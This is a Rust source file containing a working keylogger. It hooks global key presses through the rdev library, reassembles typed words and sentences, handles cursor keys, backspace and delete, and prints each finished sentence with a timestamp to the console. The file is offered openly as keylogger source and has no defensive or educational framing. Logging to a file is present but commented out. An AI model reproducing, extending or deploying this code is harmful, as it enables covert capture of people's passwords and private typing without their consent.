use chrono::prelude::*;
//use std::fs::OpenOptions;
//use std::io::Write;
use rdev::{EventType::*, Key::*};

/// Keylogger loop
pub fn log_keys() {
    // keep tack of cursor position using left and right arrow keys
    let mut cursor_pos = 0;
    // hold current word like this ["apple"]
    let mut key_buffer: Vec<String> = Vec::new();
    // hold current sentence like this ["hello", "world!"]
    let mut words: Vec<String> = Vec::new();

    // blocking
    rdev::listen(move |event| {
        let key = match event.event_type {
            KeyPress(key) => Some(key),
            _ => None,
        };
        //Get the keybuffer as a string, quite a misleading name
        let sentence = key_buffer.iter().map(|s| s.trim()).collect::<String>();

        if let Some(key) = key {
            match key {
                Space => {
                    cursor_pos = 0;
                    key_buffer.clear();
                    key_buffer.push(" ".to_string());
                    sentence.split_whitespace().for_each(|s| {
                        words.push(s.to_string());
                    });
                    key_buffer.clear();
                }
                LeftArrow => {
                    if cursor_pos >= 1 {
                        cursor_pos -= 1;
                    }
                }
                RightArrow => {
                    if cursor_pos < key_buffer.len() {
                        cursor_pos += 1;
                    };
                }
                Backspace | Delete => {
                    let kcode: Option<u8> = match event.name {
                        Some(key) => {
                            let kcode = key.bytes().last().unwrap();
                            Some(kcode)
                        }
                        None => None,
                    };
                    if kcode == Some(127_u8) {
                        // handling DEL WORD
                        // won't work on linux
                        words.pop();
                    } else if cursor_pos >= 1 {
                        key_buffer.remove(cursor_pos - 1);
                        // handle BACKSPACE key
                        cursor_pos -= 1;
                    } else {
                        // handle DELETE key
                        panic!("not covered case! kcode is {:?}", kcode)
                    }
                }
                Return | Enter => {
                    words.push(key_buffer.join(""));
                    if words.last().unwrap() == "" {
                        words.remove(words.len() - 1);
                    }
                    // convert the word array into one sentence
                    let sentence_from_words = words.join(" ");
                    words.clear();
                    key_buffer.clear();
                    cursor_pos = 0;
                    if sentence_from_words.trim() != "" {
                        //                        let timestamp = Local::now();
                        let timestamp: DateTime<Local> = DateTime::from(event.time);
                        println!("[{:?}] [Keyboard] {:?}", timestamp, sentence_from_words);
                    }
                }
                _ => {
                    println!("all else pressed {:?}", key);
                    if let Some(key) = event.name {
                        if key.bytes().last() < Some(127_u8) && key.bytes().last() > Some(31_u8) {
                            add_key_to_kb(key, &mut key_buffer, cursor_pos).unwrap();
                            cursor_pos += 1;
                        }
                    } else {
                        println!("pressed {:?}", key);
                    }
                }
            };
        }
    })
    .unwrap();
}

// Adds keys to kb
fn add_key_to_kb(
    key: String,
    kb: &mut Vec<String>,
    pos: usize,
) -> Result<(), Box<dyn std::error::Error>> {
    kb.insert(pos, key);
    Ok(())
}
